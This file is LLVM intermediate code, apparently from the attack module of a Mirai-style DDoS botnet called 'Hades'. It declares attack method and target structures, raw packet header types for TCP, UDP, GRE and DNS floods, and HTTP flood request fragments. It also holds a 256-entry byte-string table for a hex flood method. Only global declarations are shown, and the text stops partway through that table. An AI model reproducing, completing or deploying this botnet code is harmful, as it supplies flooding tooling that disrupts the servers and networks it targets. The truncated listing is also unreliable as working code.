; ModuleID = 'host/ir_bcf/Hades.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.grehdr = type { i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] [i32 3, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0], align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@attack_method_stdhex.satuur_thicc = private unnamed_addr constant [256 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.1.16 = private unnamed_addr constant [2 x i8] c"\01\00", align 1
@.str.2.17 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.3.18 = private unnamed_addr constant [2 x i8] c"\03\00", align 1
@.str.4.19 = private unnamed_addr constant [2 x i8] c"\04\00", align 1
@.str.5.20 = private unnamed_addr constant [2 x i8] c"\05\00", align 1
@.str.6.21 = private unnamed_addr constant [2 x i8] c"\06\00", align 1
@.str.7.22 = private unnamed_addr constant [2 x i8] c"\07\00", align 1
@.str.8.23 = private unnamed_addr constant [2 x i8] c"\08\00", align 1
@.str.9.24 = private unnamed_addr constant [2 x i8] c"\09\00", align 1
@.str.10.25 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.11.26 = private unnamed_addr constant [2 x i8] c"\0B\00", align 1
@.str.12.27 = private unnamed_addr constant [2 x i8] c"\0C\00", align 1
@.str.13.28 = private unnamed_addr constant [2 x i8] c"\0D\00", align 1
@.str.14.29 = private unnamed_addr constant [2 x i8] c"\0E\00", align 1
@.str.15.30 = private unnamed_addr constant [2 x i8] c"\0F\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\10\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] c"\11\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"\12\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\14\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"\15\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"\16\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c"\17\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c"\18\00", align 1
@.str.25 = private unnamed_addr constant [2 x i8] c"\19\00", align 1
@.str.26 = private unnamed_addr constant [2 x i8] c"\1A\00", align 1
@.str.27 = private unnamed_addr constant [2 x i8] c"\1B\00", align 1
@.str.28 = private unnamed_addr constant [2 x i8] c"\1C\00", align 1
@.str.29 = private unnamed_addr constant [2 x i8] c"\1D\00", align 1
@.str.30 = private unnamed_addr constant [2 x i8] c"\1E\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"\1F\00", align 1
@.str.32 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"!\00", align 1
@.str.34 = private unnamed_addr constant [2 x i8] c"\22\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] c"%\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"&\00", align 1
@.str.39 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"(\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c")\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"*\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"+\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.50 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.51 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.54 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.55 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.56 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.58 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.59 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c"<\00", align 1
@.str.61 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.62 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.63 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.64 = private unnamed_addr constant [2 x i8] c"@\00", align 1
